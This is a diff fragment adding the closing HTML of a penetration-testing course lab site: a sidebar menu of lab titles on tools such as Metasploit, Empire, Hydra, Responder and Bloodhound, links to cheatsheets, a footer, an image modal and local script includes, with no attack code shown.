+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
